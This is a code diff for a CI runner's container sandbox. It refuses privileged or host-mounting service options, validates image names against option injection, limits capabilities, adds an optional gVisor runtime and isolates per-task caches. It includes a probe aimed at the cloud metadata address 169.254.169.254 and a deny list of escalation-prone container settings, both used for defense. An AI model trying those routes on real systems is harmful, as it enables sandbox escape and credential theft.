@@ -61,6 +61,23 @@ pub fn cancel_other(name: &str, tree_hash: &str) {
     }
 }
 
+/// Where each proof in hand stands, by name (a task's id): what `avp status` and a land that waits
+/// for its proof show, set as the proof goes and gone with it.
+static PHASE: Mutex<BTreeMap<String, String>> = Mutex::new(BTreeMap::new());
+
+fn set_phase(name: &str, phase: Option<String>) {
+    let mut p = PHASE.lock().unwrap_or_else(|e| e.into_inner());
+    match phase {
+        Some(ph) => p.insert(name.to_string(), ph),
+        None => p.remove(name),
+    };
+}
+
+/// What the proof of `name` does now on this machine: waiting for a slot, preparing, a step.
+pub fn phase(name: &str) -> Option<String> {
+    PHASE.lock().unwrap_or_else(|e| e.into_inner()).get(name).cloned()
+}
+
 /// Stops the checks of `name` on `tree_hash`: one part of the proof is red, the others are moot.
 pub fn cancel_tree(name: &str, tree_hash: &str) {
     for (n, h, flag) in IN_FLIGHT.lock().unwrap_or_else(|e| e.into_inner()).iter() {
@@ -203,6 +220,7 @@ impl Drop for Slot {
 }
 
 #[derive(Clone, Debug, Deserialize, Default)]
+#[serde(deny_unknown_fields)]
 pub struct CheckConfig {
     /// Run once per dependency fingerprint in the repo's cache dir, e.g. `pnpm install --frozen-lockfile`.
     pub setup: Option<String>,
@@ -444,6 +462,13 @@ struct ServiceFields {
     ready_s: Option<u64>,
     #[serde(default)]
     env: toml::Table,
+    /// What GitHub's services take and AVP never does: said, they are refused rather than ignored.
+    options: Option<toml::Value>,
+    volumes: Option<toml::Value>,
+    privileged: Option<toml::Value>,
+    cap_add: Option<toml::Value>,
+    user: Option<toml::Value>,
+    network: Option<toml::Value>,
 }
 
 impl TryFrom<ServiceFields> for Service {
@@ -464,8 +489,19 @@ impl TryFrom<ServiceFields> for Service {
             .filter(|p| *p > 0)
         };
         let ports = f.ports.iter().map(|v| port(v).ok_or_else(|| format!("service {name}: {v} is not a port"))).collect::<std::result::Result<Vec<u16>, _>>()?;
+        // AVP runs a service's container itself, the same way for every repo: an option that would
+        // give it the machine (a privilege, a capability, a folder, the host's network) is no
+        // avp.toml's to say.
+        for (key, said) in [("options", &f.options), ("volumes", &f.volumes), ("privileged", &f.privileged), ("cap_add", &f.cap_add), ("user", &f.user), ("network", &f.network)] {
+            if said.is_some() {
+                return Err(format!("service {name}: `{key}` is not taken: AVP starts a service's container itself, in the job's network, with no privilege and no folder of the machine; `env`, `ports` and `ready` are what a service says"));
+            }
+        }
         let kind = match (f.image, f.run) {
-            (Some(image), None) => ServiceKind::Image { image, ports },
+            (Some(image), None) => {
+                image_ref(&image).map_err(|e| format!("service {name}: {e}"))?;
+                ServiceKind::Image { image, ports }
+            }
             (None, Some(run)) if ports.is_empty() => ServiceKind::Run(run),
             (None, Some(_)) => return Err(format!("service {name}: `ports` is for an image; a `run` service listens on {{port}}, a free port AVP picks")),
             (Some(_), Some(_)) => return Err(format!("service {name} is `image` (a container) or `run` (a command), not both")),
@@ -515,6 +551,7 @@ impl TryFrom<ScheduleFields> for Schedule {
 }
 
 #[derive(Clone, Debug, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct ConfiguredStep {
     pub name: String,
     pub run: String,
@@ -593,6 +630,13 @@ pub fn take_timing(name: &str, tree_hash: &str) -> Option<ProofTiming> {
 
 /// What to show of a red step: a split step lists its shares failures first, so the first share,
 /// not the tail of the whole, which would be a green share's.
+/// `text` without its terminal escapes (colors, cursor moves): what an agent reads of a log, where
+/// each one costs tokens and says nothing. The stored log keeps them.
+pub fn strip_ansi(text: &str) -> std::borrow::Cow<'_, str> {
+    static ESC: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"\x1b(?:\[[0-9;?]*[ -/]*[@-~]|\][^\x07\x1b]*(?:\x07|\x1b\\)|[@-_])").unwrap());
+    ESC.replace_all(text, "")
+}
+
 pub fn red_part(output: &str) -> &str {
     output.split("\n== share ").nth(1).unwrap_or(output)
 }
@@ -640,6 +684,7 @@ impl Part {
 }
 
 #[derive(Clone, Debug, Deserialize, Default)]
+#[serde(deny_unknown_fields)]
 pub struct AvpConfig {
     #[serde(default)]
     pub check: CheckConfig,
@@ -941,13 +986,18 @@ fn remove_all(path: &Path) -> Result<()> {
     fs::remove_dir_all(path).with_context(|| format!("remove {}", path.display()))
 }
 
-fn fingerprint(tree: &Tree, keys: &[String]) -> String {
+/// What the setup's products are made of: every file it is laid out with, and its command. A task
+/// that keeps the lockfile but changes the command (or a package.json the keys do not name) makes
+/// a setup of its own, never one a task with the same keys would take for its own.
+fn fingerprint(subset: &Tree, setup: &str) -> String {
     let mut h = blake3::Hasher::new();
-    for k in keys {
-        h.update(k.as_bytes());
-        if let Some(e) = tree.get(k) {
-            h.update(e.blob.as_bytes());
-        }
+    h.update(setup.as_bytes());
+    for (path, e) in subset {
+        h.update(b"\0");
+        h.update(path.as_bytes());
+        h.update(b"\0");
+        h.update(e.blob.as_bytes());
+        h.update(&e.mode.to_le_bytes());
     }
     h.finalize().to_hex().to_string()
 }
@@ -1063,8 +1113,9 @@ fn shell(dir: &Path, command: &str, env: &[(OsString, OsString)], jail: Option<&
         Some(_) => sandbox_env(std::env::vars_os(), &listed, &deploy),
     };
     vars.extend(env.iter().cloned());
-    // The same locale as a CI runner: a test that formats money must not depend on the host.
-    vars.extend([("CI", "true"), ("AVP", "1"), ("TRAME", "1"), ("LANG", "en_US.UTF-8"), ("LC_ALL", "en_US.UTF-8")].map(|(k, v)| (OsString::from(k), OsString::from(v))));
+    // The same locale as a CI runner: a test that formats money must not depend on the host. No
+    // colors: an agent reads the log, and escapes are tokens that say nothing.
+    vars.extend([("CI", "true"), ("AVP", "1"), ("TRAME", "1"), ("LANG", "en_US.UTF-8"), ("LC_ALL", "en_US.UTF-8"), ("NO_COLOR", "1"), ("FORCE_COLOR", "0")].map(|(k, v)| (OsString::from(k), OsString::from(v))));
     let mut cmd = match jail {
         None => {
             let mut cmd = Command::new("sh");
@@ -1827,6 +1878,10 @@ impl Up {
                 if let Some((how, printed)) = gone {
                     return Err(failed(s, 1, format!("the service {} stopped before it was ready ({how}): the steps did not run\n{}", s.name, tail(&printed))));
                 }
+                // Its `ready_s` is avp.toml's to say, the job's time the server's.
+                if let Some(over) = jail.and_then(|j| j.over(&mut Instant::now())) {
+                    return Err(failed(s, 1, format!("the service {} was not ready: sandbox: {over}", s.name)));
+                }
                 if Instant::now() >= deadline {
                     let printed = match &up.running[i] {
                         Running::Process(_) => fs::read_to_string(&st.log).unwrap_or_default(),
@@ -1960,6 +2015,9 @@ pub struct Sandbox {
     /// What labels this worker's containers and networks (its data folder): a worker that starts
     /// again removes what it left, and only that.
     pub owner: String,
+    /// The OCI runtime jobs and services run under (AVP_SANDBOX_RUNTIME): `runsc`, gVisor, gives
+    /// each container a kernel of its own in front of the machine's. None: the tool's default, runc.
+    pub runtime: Option<String>,
 }
 
 /// The networks' bridges are named `avpj` and 11 characters: the firewall's rules match `avpj+`.
@@ -1998,7 +2056,15 @@ impl Sandbox {
         let own = String::new();
         let user = std::env::var("AVP_SANDBOX_USER").ok().filter(|u| !u.trim().is_empty()).unwrap_or(own);
         anyhow::ensure!(!["", "0", "root"].contains(&user.split(':').next().unwrap_or("")), "the sandbox runs steps as a user other than root: a worker started as root names one, AVP_SANDBOX_USER=uid:gid, who owns its data folder");
-        Ok(Some(Sandbox { tool, image: image.trim().to_string(), user, limits: Limits::from_env(), owner: data.to_string_lossy().to_string() }))
+        image_ref(image.trim()).map_err(|e| anyhow::anyhow!("AVP_SANDBOX_IMAGE: {e}"))?;
+        let runtime = std::env::var("AVP_SANDBOX_RUNTIME").ok().map(|r| r.trim().to_string()).filter(|r| !r.is_empty());
+        if let Some(rt) = &runtime {
+            // Asked for and absent, it is not quietly runc: the worker does not start.
+            anyhow::ensure!(rt.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_'), "AVP_SANDBOX_RUNTIME={rt}: a runtime's name, `runsc` for gVisor");
+            let known = Command::new(tool).args(["info", "--format", "{{json .Runtimes}}"]).stderr(Stdio::null()).output().map(|o| String::from_utf8_lossy(&o.stdout).to_string()).unwrap_or_default();
+            anyhow::ensure!(tool == "podman" || known.contains(&format!("\"{rt}\"")), "AVP_SANDBOX_RUNTIME={rt}: {tool} on this machine has no such runtime (it has {}): install it (gVisor: runsc install), or leave the variable out to run jobs under runc", known.trim());
+        }
+        Ok(Some(Sandbox { tool, image: image.trim().to_string(), user, limits: Limits::from_env(), owner: data.to_string_lossy().to_string(), runtime }))
     }
 
     /// This sandbox for one job: the server's limits first.
@@ -2023,7 +2089,7 @@ impl Sandbox {
     pub fn probe(&self, data: &Path) -> Result<()> {
         let dir = data.join("sandbox-probe");
         fs::create_dir_all(&dir)?;
-        let jail = Jail::start(self, &self.image, &[&dir], &dir, None, &dir)?;
+        let jail = Jail::start(self, &self.image, &[], (&dir, &dir), None, &[&dir])?;
         let mut targets = vec!["169.254.169.254:80".to_string()];
         targets.extend(names_in(&std::env::var("AVP_SANDBOX_PROBE").unwrap_or_default()).into_iter().map(String::from));
         let out = jail.exec(&dir, PROBE, &[("AVP_PROBE".into(), targets.join(" ").into())]).env("AVP_PROBE", targets.join(" ")).stdin(Stdio::null()).output()?;
@@ -2034,7 +2100,7 @@ impl Sandbox {
 
     /// `run -d` of a job's container, as `jail.exec` then runs its steps in it: what makes it a
     /// sandbox is here, in one place.
-    fn run_args(&self, image: &str, name: &str, mounts: &[&Path], home: &Path) -> Vec<String> {
+    fn run_args(&self, image: &str, name: &str, mounts: &[&Path], (home, home_at): (&Path, &Path)) -> Vec<String> {
         let mut a: Vec<String> = ["run", "-d", "--name", name, "--label"].map(String::from).to_vec();
         a.push(format!("avp.sandbox={}", self.owner));
         a.extend(["--network".into(), name.into(), "--init".into(), "--user".into(), self.user.clone()]);
@@ -2044,6 +2110,7 @@ impl Sandbox {
             a.push("--userns=keep-id".into());
         }
         a.extend(["--cap-drop", "ALL", "--security-opt", "no-new-privileges", "--read-only"].map(String::from));
+        a.extend(runtime_args(&self.runtime));
         let size = self.limits.disk.as_ref().map(|d| format!(",size={d}")).unwrap_or_default();
         a.extend(["--tmpfs".into(), format!("/tmp:rw,nosuid,nodev,mode=1777{size}")]);
         a.extend(limit_args(&self.limits));
@@ -2051,8 +2118,10 @@ impl Sandbox {
             a.extend(["-v".into(), format!("{0}:{0}", m.display())]);
         }
         // The caches a build keeps (cargo's registry, pnpm's store, corepack's pnpm) under the repo's
-        // own home, never another repo's.
-        let home = home.display();
+        // own home, never another repo's: the job's own copy of it (`Workspace::caches`), seen at
+        // the line's path, so that what a build kept naming it (cargo's fingerprints) still holds.
+        a.extend(["-v".into(), format!("{}:{}", home.display(), home_at.display())]);
+        let home = home_at.display();
         for (k, v) in [("HOME", format!("{home}")), ("XDG_CACHE_HOME", format!("{home}/.cache")), ("CARGO_HOME", format!("{home}/.cargo")), ("COREPACK_HOME", format!("{home}/.corepack")), ("npm_config_store_dir", format!("{home}/.pnpm-store")), ("COREPACK_ENABLE_DOWNLOAD_PROMPT", "0".into()), ("TMPDIR", "/tmp".into())] {
             a.extend(["-e".into(), format!("{k}={v}")]);
         }
@@ -2090,6 +2159,22 @@ fn limit_args(limits: &Limits) -> Vec<String> {
     a
 }
 
+fn runtime_args(runtime: &Option<String>) -> Vec<String> {
+    runtime.iter().flat_map(|r| ["--runtime".to_string(), r.clone()]).collect()
+}
+
+/// What a database's image needs of root to start: its entrypoint gives its folder to its own user
+/// (chown, a mode) and becomes that user (gosu, su-exec), and some listen below 1024. Nothing that
+/// reaches past the container: no SYS_ADMIN, no NET_ADMIN, no raw sockets, no module, no ptrace.
+const SERVICE_CAPS: [&str; 6] = ["CHOWN", "DAC_OVERRIDE", "FOWNER", "SETGID", "SETUID", "NET_BIND_SERVICE"];
+
+/// An image's name as docker reads one, `registry/name:tag@sha256:...`, and nothing else: one that
+/// starts with `-` would be read as an option (`--privileged`), one with a space as two words.
+fn image_ref(image: &str) -> std::result::Result<(), String> {
+    let ok = !image.is_empty() && image.len() <= 255 && !image.starts_with(['-', '.', '/', ':', '@']) && image.chars().all(|c| c.is_ascii_alphanumeric() || "._-/:@".contains(c));
+    if ok { Ok(()) } else { Err(format!("{image:?} is not an image's name (registry/name:tag, letters, digits and . _ - / : @)")) }
+}
+
 /// What the probe said: Err when something answered that must not, or when it could not tell.
 fn probed(out: &str, image: &str) -> std::result::Result<(), String> {
     let reached: Vec<&str> = out.lines().filter_map(|l| l.strip_prefix("reached ")).collect();
@@ -2120,21 +2205,24 @@ pub struct Jail {
     name: String,
     limits: Limits,
     deadline: Option<Instant>,
-    /// What the disk limit measures.
-    dir: PathBuf,
+    /// What the disk limit measures: the job's folder and its own caches.
+    dirs: Vec<PathBuf>,
+    /// The worker's label, and the runtime: its services' containers get them too.
+    owner: String,
+    runtime: Option<String>,
 }
 
 impl Jail {
     /// The job's network, then its container from `image`, `mounts` read-write at the same path
-    /// and `home` the repo's caches. Err says why: the job runs nothing outside its sandbox.
-    fn start(sb: &Sandbox, image: &str, mounts: &[&Path], home: &Path, deadline: Option<Instant>, dir: &Path) -> Result<Jail> {
+    /// and `home` the job's caches (on the machine, and where the container sees it). Err says why:
+    /// the job runs nothing outside its sandbox.
+    fn start(sb: &Sandbox, image: &str, mounts: &[&Path], home: (&Path, &Path), deadline: Option<Instant>, dirs: &[&Path]) -> Result<Jail> {
+        image_ref(image).map_err(|e| anyhow::anyhow!("[check] image: {e}"))?;
         let id = ulid::Ulid::new().to_string().to_lowercase();
-        let jail = Jail { tool: sb.tool, name: format!("avp-job-{id}"), limits: sb.limits.clone(), deadline, dir: dir.to_path_buf() };
-        fs::create_dir_all(home)?;
+        let jail = Jail { tool: sb.tool, name: format!("avp-job-{id}"), limits: sb.limits.clone(), deadline, dirs: dirs.iter().map(|d| d.to_path_buf()).collect(), owner: sb.owner.clone(), runtime: sb.runtime.clone() };
+        fs::create_dir_all(home.0)?;
         let bridge = format!("{BRIDGE_PREFIX}{}", &id[id.len() - 11..]);
-        let mut mounts = mounts.to_vec();
-        mounts.push(home);
-        for args in [sb.network_args(&jail.name, &bridge), sb.run_args(image, &jail.name, &mounts, home)] {
+        for args in [sb.network_args(&jail.name, &bridge), sb.run_args(image, &jail.name, mounts, home)] {
             // Pulls the image the first time: as long as it takes.
             let out = Command::new(sb.tool).args(&args).stdin(Stdio::null()).output().with_context(|| format!("{} {}", sb.tool, args[0]))?;
             anyhow::ensure!(out.status.success(), "the job's sandbox did not start ({} {} {image}): {}", sb.tool, args[0], tail(&String::from_utf8_lossy(&out.stderr)));
@@ -2148,6 +2236,17 @@ impl Jail {
         let mut cmd = Command::new(self.tool);
         cmd.args(exec_args(&self.name, dir, vars, command));
         cmd
+    }
+
+    /// `f` while every process of the job is frozen (`pause`). Not frozen, nothing is run: an error.
+    fn frozen(&self, f: impl FnOnce() -> Artifacts) -> Artifacts {
+        let paused = Command::new(self.tool).args(["pause", self.name.as_str()]).stdout(Stdio::null()).stderr(Stdio::null()).status().is_ok_and(|s| s.success());
+        if !paused {
+            return Artifacts { error: Some("the job's container could not be paused to pack its artifacts: none packed".into()), ..Default::default() };
+        }
+        let a = f();
+        let _ = Command::new(self.tool).args(["unpause", self.name.as_str()]).stdout(Stdio::null()).stderr(Stdio::null()).status();
+        a
     }
 
     /// Stops what runs in it, at once: a cancelled step, or one past a limit.
@@ -2168,7 +2267,7 @@ impl Jail {
             return None;
         }
         *measured = Instant::now();
-        (size_of(&self.dir) > max).then(|| format!("the job's folder went past its disk limit, AVP_SANDBOX_DISK={}: stopped", self.limits.disk.as_deref().unwrap_or_default()))
+        (self.dirs.iter().map(|d| size_of(d)).sum::<u64>() > max).then(|| format!("the job's folder went past its disk limit, AVP_SANDBOX_DISK={}: stopped", self.limits.disk.as_deref().unwrap_or_default()))
     }
 
     /// Whether something listens on `port` in the job's network.
@@ -2178,10 +2277,17 @@ impl Jail {
     }
 
     /// What a service's container adds to `run`: the job's network itself, so that `localhost:{port}`
-    /// reaches it from a step as it does on a machine, nothing published on the host, and the job's
-    /// limits. Its image runs as it wants (a database starts as root) but gains no privilege.
+    /// reaches it from a step as it does on a machine, nothing published on the host, no folder of
+    /// the machine, the job's limits and runtime, and the worker's label (a worker killed mid-job
+    /// sweeps it as it sweeps the job's). Its image starts as it wants (a database starts as root)
+    /// with only the capabilities a database's entrypoint needs, and gains no privilege.
     fn service_args(&self) -> Vec<String> {
-        let mut a = vec!["--network".into(), format!("container:{}", self.name), "--security-opt".into(), "no-new-privileges".into()];
+        let mut a = vec!["--network".into(), format!("container:{}", self.name), "--label".into(), format!("avp.sandbox={}", self.owner), "--cap-drop".into(), "ALL".into()];
+        for cap in SERVICE_CAPS {
+            a.extend(["--cap-add".into(), cap.into()]);
+        }
+        a.extend(["--security-opt".into(), "no-new-privileges".into()]);
+        a.extend(runtime_args(&self.runtime));
         a.extend(limit_args(&self.limits));
         a
     }
@@ -2285,6 +2391,92 @@ pub fn failing_tests(output: &str) -> Vec<String> {
     out
 }
 
+/// Where a job's caches are: its setup's folder and its home (cargo's registry, pnpm's store).
+struct Caches {
+    setup: PathBuf,
+    home: PathBuf,
+    /// Where the job's container sees `home`: the line's own path, the same for every job of the
+    /// repo, so that what a build kept naming it (cargo's fingerprints) holds from one to the next.
+    home_at: PathBuf,
+    /// In a sandbox, the job's own copy of the line's caches, `setup` and `home` in it.
+    own: Option<PathBuf>,
+}
+
+/// Who left a slot's folder as the line's: a green shard of the whole suite.
+const LINE: &str = "line";
+
+/// How many tasks of one repo keep their own caches on a worker: the most recent ones.
+const OWN_CACHES: usize = 4;
+
+/// The jobs on each own copy now, so that a prune never takes one from under a job.
+static OWN_IN_USE: Mutex<BTreeMap<PathBuf, usize>> = Mutex::new(BTreeMap::new());
+
+/// Whether a job runs what the line holds, a shard of the whole suite on a landed position: the
+/// only proof whose caches the next proofs may trust once it is green.
+fn of_the_line(name: &str) -> bool {
+    name.starts_with("line-")
+}
+
+/// What `settle` needs once a sandboxed job is over, whatever ended it: dropped last in
+/// `check_steps`, after the job's container.
+struct Settle<'a> {
+    ws: &'a Workspace,
+    caches: Caches,
+    name: String,
+    slot: PathBuf,
+    left_by: PathBuf,
+    keep: Vec<String>,
+    green: bool,
+}
+
+impl Drop for Settle<'_> {
+    fn drop(&mut self) {
+        self.ws.settle(self);
+    }
+}
+
+/// `from` copied to `to`, links as links, by the machine's `cp`: on Linux a reflink where the disk
+/// has them (XFS, btrfs), so a cache of gigabytes is copied in seconds. Nothing to copy, nothing done.
+fn clone_dir(from: &Path, to: &Path) -> Result<()> {
+    if !fs::symlink_metadata(from).is_ok_and(|m| m.is_dir()) {
+        return Ok(());
+    }
+    if let Some(parent) = to.parent() {
+        fs::create_dir_all(parent)?;
+    }
+    let mut cp = Command::new("cp");
+    cp.arg("-a");
+    #[cfg(target_os = "linux")]
+    cp.arg("--reflink=auto");
+    let out = cp.arg(from).arg(to).stdin(Stdio::null()).output()?;
+    anyhow::ensure!(out.status.success(), "cp {}: {}", from.display(), String::from_utf8_lossy(&out.stderr).trim());
+    Ok(())
+}
+
+/// `to` becomes what `from` is: moved, or copied when `copy` (the slot keeps its own). The old `to`
+/// goes once the new one is in place. A link is refused: the line's caches hold folders.
+fn replace_dir(from: &Path, to: &Path, copy: bool) -> Result<()> {
+    let Ok(meta) = fs::symlink_metadata(from) else { return Ok(()) };
+    anyhow::ensure!(meta.is_dir(), "{} is not a folder", from.display());
+    let id = ulid::Ulid::new().to_string().to_lowercase();
+    let name = to.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
+    let (fresh, old) = (to.with_file_name(format!(".{name}.{id}.new")), to.with_file_name(format!(".{name}.{id}.old")));
+    if copy {
+        clone_dir(from, &fresh)?;
+    } else {
+        if let Some(parent) = fresh.parent() {
+            fs::create_dir_all(parent)?;
+        }
+        fs::rename(from, &fresh)?;
+    }
+    let had = fs::rename(to, &old).is_ok();
+    fs::rename(&fresh, to)?;
+    if had {
+        remove_all(&old)?;
+    }
+    Ok(())
+}
+
 pub struct Workspace {
     pub work: PathBuf,
     pub cache: PathBuf,
@@ -2334,18 +2526,131 @@ impl Workspace {
         Self { work: data.join("work").join(repo), cache: data.join("cache").join(repo), kept: Kept::new(data), secrets: Given::Store(data.to_path_buf(), repo.to_string()), sandbox: None }
     }
 
+    /// The repo names folders of this machine (its work, its caches): one name, the server's id for
+    /// it, never a path into another repo's, whatever a job says.
+    fn one_repo(&self) -> Result<()> {
+        let name = self.cache.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
+        anyhow::ensure!(safe_path(&name) && self.cache.parent().and_then(|p| p.file_name()) == Some(std::ffi::OsStr::new("cache")), "{:?} is not a repo's name: a job names one", self.cache.display());
+        Ok(())
+    }
+
     /// On a worker started with AVP_SANDBOX: each check in a container of its own.
     pub fn with_sandbox(mut self, sandbox: Option<Sandbox>) -> Self {
         self.sandbox = sandbox;
         self
     }
 
-    /// The job's container when there is a sandbox, with `mounts` and the repo's own home (its
-    /// caches): the sandbox's image unless avp.toml names one. None without a sandbox.
-    fn jail(&self, cfg: &CheckConfig, mounts: &[&Path], dir: &Path, deadline: Option<Instant>) -> Result<Option<Jail>> {
+    /// The job's container when there is a sandbox, with `mounts` and the job's home (its caches):
+    /// the sandbox's image unless avp.toml names one. None without a sandbox.
+    fn jail(&self, cfg: &CheckConfig, mounts: &[&Path], caches: &Caches, dir: &Path, deadline: Option<Instant>) -> Result<Option<Jail>> {
         let Some(sb) = &self.sandbox else { return Ok(None) };
         let image = cfg.image.as_deref().filter(|i| !i.trim().is_empty()).unwrap_or(&sb.image);
-        Ok(Some(Jail::start(sb, image, mounts, &self.cache.join("home"), deadline, dir)?))
+        let measured: Vec<&Path> = std::iter::once(dir).chain(caches.own.as_deref()).collect();
+        Ok(Some(Jail::start(sb, image, mounts, (&caches.home, &caches.home_at), deadline, &measured)?))
+    }
+
+    /// The caches a job uses. Without a sandbox, the repo's own: a team's machine runs its own code.
+    /// In a sandbox, what one job writes no other job trusts until the line does: a task's jobs work
+    /// on a copy of the line's caches of their own, kept for its next proofs, and a shard of the
+    /// whole suite on a fresh copy, which becomes the line's only once it is green (`settle`).
+    fn caches(&self, name: &str) -> Result<Caches> {
+        let (setup, home) = (self.cache.join("setup"), self.cache.join("home"));
+        if self.sandbox.is_none() {
+            return Ok(Caches { setup, home: home.clone(), home_at: home, own: None });
+        }
+        let key = if of_the_line(name) {
+            format!(".line-{}", ulid::Ulid::new().to_string().to_lowercase())
+        } else if !name.is_empty() && name.len() <= 100 && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_') {
+            name.to_string()
+        } else {
+            blake3::hash(name.as_bytes()).to_hex()[..32].to_string()
+        };
+        let all = self.cache.join("own");
+        let own = all.join(&key);
+        let mut used = OWN_IN_USE.lock().unwrap_or_else(|e| e.into_inner());
+        if !own.is_dir() {
+            // Copied aside, then put in place: a worker stopped halfway leaves no half a cache.
+            let seeding = all.join(format!("{key}.seeding"));
+            let _ = remove_all(&seeding);
+            fs::create_dir_all(&seeding)?;
+            for sub in ["setup", "home"] {
+                if let Err(e) = clone_dir(&self.cache.join(sub), &seeding.join(sub)) {
+                    eprintln!("{name}: the line's {sub} cache not copied, the job starts without it: {e:#}");
+                    let _ = remove_all(&seeding.join(sub));
+                }
+            }
+            fs::rename(&seeding, &own)?;
+        }
+        let _ = crate::view::date_now(&own);
+        *used.entry(own.clone()).or_default() += 1;
+        // The tasks' copies a worker keeps: the most recent few, never one a job runs on.
+        let mut others: Vec<(std::time::SystemTime, PathBuf)> = fs::read_dir(&all).into_iter().flatten().flatten().map(|e| e.path()).filter(|p| !used.contains_key(p)).map(|p| (fs::metadata(&p).and_then(|m| m.modified()).unwrap_or(std::time::UNIX_EPOCH), p)).collect();
+        others.sort_by(|a, b| b.0.cmp(&a.0));
+        for (i, (_, p)) in others.iter().enumerate() {
+            let left = p.file_name().is_some_and(|n| n.to_string_lossy().starts_with('.') || n.to_string_lossy().ends_with(".seeding"));
+            if left || i + 1 >= OWN_CACHES {
+                let _ = remove_all(p);
+            }
+        }
+        Ok(Caches { setup: own.join("setup"), home: own.join("home"), home_at: home, own: Some(own) })
+    }
+
+    /// A slot's folder, as the last job left it, is this job's to reuse only if that job was this
+    /// task's (its own state) or a green shard of the whole suite (the line's); else it is laid out
+    /// anew, its `keep` folders copied from the line's. Who left it is written beside the folder,
+    /// where no step writes: a step can rewrite `.avp-laid` and what it describes, not this.
+    fn claim_slot(&self, dir: &Path, left_by: &Path, name: &str, keep: &[String]) -> Result<()> {
+        let last = fs::read_to_string(left_by).unwrap_or_default();
+        if !(last == LINE || (!of_the_line(name) && last == name)) {
+            if dir.exists() {
+                remove_all(dir)?;
+            }
+            for k in keep.iter().filter(|k| safe_path(k)) {
+                if let Err(e) = clone_dir(&self.cache.join("keep").join(k), &dir.join(k)) {
+                    eprintln!("{name}: the line's {k} not copied, the job builds it again: {e:#}");
+                    let _ = remove_all(&dir.join(k));
+                }
+            }
+        }
+        fs::write(left_by, name)?;
+        Ok(())
+    }
+
+    /// After a sandboxed job, its container gone: a green shard of the whole suite gives the line its
+    /// caches (its setup, its home, the slot's `keep` folders) and leaves the slot as the line's; a
+    /// red or cut one's go. A task's stay its own. A copy or a slot past the disk limit goes too: a
+    /// job that filled its disk leaves the worker's as it found it, for the next one.
+    fn settle(&self, s: &Settle) {
+        let Some(own) = &s.caches.own else { return };
+        let mut used = OWN_IN_USE.lock().unwrap_or_else(|e| e.into_inner());
+        if let Some(n) = used.get_mut(own) {
+            *n -= 1;
+            if *n == 0 {
+                used.remove(own);
+            }
+        }
+        let max = self.sandbox.as_ref().and_then(|sb| sb.limits.disk.as_deref()).and_then(bytes);
+        if of_the_line(&s.name) {
+            if s.green {
+                let mut promoted = true;
+                for sub in ["setup", "home"] {
+                    promoted &= replace_dir(&own.join(sub), &self.cache.join(sub), false).inspect_err(|e| eprintln!("{}: the line's {sub} cache not saved: {e:#}", s.name)).is_ok();
+                }
+                for k in s.keep.iter().filter(|k| safe_path(k)) {
+                    promoted &= replace_dir(&s.slot.join(k), &self.cache.join("keep").join(k), true).inspect_err(|e| eprintln!("{}: the line's {k} not saved: {e:#}", s.name)).is_ok();
+                }
+                if promoted {
+                    let _ = fs::write(&s.left_by, LINE);
+                }
+            }
+            let _ = remove_all(own);
+        } else if max.is_some_and(|m| size_of(own) > m) {
+            let _ = remove_all(own);
+        }
+        if max.is_some_and(|m| size_of(&s.slot) > m) {
+            let _ = remove_all(&s.slot);
+            let _ = fs::remove_file(&s.left_by);
+        }
     }
 
     /// On a worker: the secrets come with the job, never from this machine.
@@ -2356,10 +2661,15 @@ impl Workspace {
 
     /// Keeps a step's log, and what its `artifacts` name, green or red: a failure to keep them is the
     /// server's to log, never a red step.
-    fn keep(&self, step: &Step, log: Log, dir: &Path, artifacts: &[String], budget: &mut u64) {
+    fn keep(&self, step: &Step, log: Log, dir: &Path, artifacts: &[String], budget: &mut u64, jail: Option<&Jail>) {
         let key = kept_key(step);
         let out = self.kept.dir.join(format!("{key}.tar.gz"));
-        let packed = (!artifacts.is_empty()).then(|| fs::create_dir_all(&self.kept.dir).map(|_| pack(dir, artifacts, budget, &out)));
+        // The worker packs on the machine, where a link leads anywhere: what the step left running
+        // is frozen meanwhile, or it could swap a folder for a link between the look and `tar`.
+        let packed = (!artifacts.is_empty()).then(|| fs::create_dir_all(&self.kept.dir).map(|_| match jail {
+            Some(j) => j.frozen(|| pack(dir, artifacts, budget, &out)),
+            None => pack(dir, artifacts, budget, &out),
+        }));
         let artifacts = match packed {
             Some(Ok(a)) => Some(a),
             Some(Err(e)) => Some(Artifacts { error: Some(e.to_string()), ..Default::default() }),
@@ -2372,16 +2682,12 @@ impl Workspace {
     }
 
     /// Runs the setup once per fingerprint and returns the dir holding its products.
-    fn setup(&self, objects: &Objects, tree: &Tree, cfg: &CheckConfig, deadline: Option<Instant>) -> Result<Option<PathBuf>> {
+    fn setup(&self, objects: &Objects, tree: &Tree, cfg: &CheckConfig, caches: &Caches, deadline: Option<Instant>) -> Result<Option<PathBuf>> {
         let Some(setup) = &cfg.setup else { return Ok(None) };
         let started = Instant::now();
         let _one_at_a_time = SETUP_LOCK.lock().unwrap_or_else(|e| e.into_inner());
-        let fp = fingerprint(tree, &cfg.setup_keys);
-        let dir = self.cache.join("setup");
+        let dir = caches.setup.clone();
         let stamp = dir.join(".avp-setup");
-        if fs::read_to_string(&stamp).ok().as_deref() == Some(fp.as_str()) {
-            return Ok(Some(dir));
-        }
         let mut subset = Tree::new();
         for k in &cfg.setup_keys {
             if let Some(e) = tree.get(k) {
@@ -2394,10 +2700,15 @@ impl Workspace {
                 subset.insert(p.clone(), e.clone());
             }
         }
+        let fp = fingerprint(&subset, setup);
+        if fs::read_to_string(&stamp).ok().as_deref() == Some(fp.as_str()) {
+            return Ok(Some(dir));
+        }
         materialize(objects, &subset, &dir, &cfg.setup_links)?;
-        // Shared by every candidate of the repo: never stopped halfway. An install runs what the
-        // packages say (their scripts): in the sandbox too, with only the cache mounted.
-        let jail = self.jail(cfg, &[&dir], &dir, deadline)?;
+        // Shared by every candidate of the repo (in a sandbox, of the task): never stopped halfway.
+        // An install runs what the packages say (their scripts): in the sandbox too, with only the
+        // cache mounted.
+        let jail = self.jail(cfg, &[&dir], caches, &dir, deadline)?;
         let step = run(&dir, setup, &AtomicBool::new(false), jail.as_ref());
         drop(jail);
         anyhow::ensure!(step.exit == 0, "setup failed ({}):\n{}", step.exit, step.output);
@@ -2413,31 +2724,46 @@ impl Workspace {
         let cancel = Arc::new(AtomicBool::new(false));
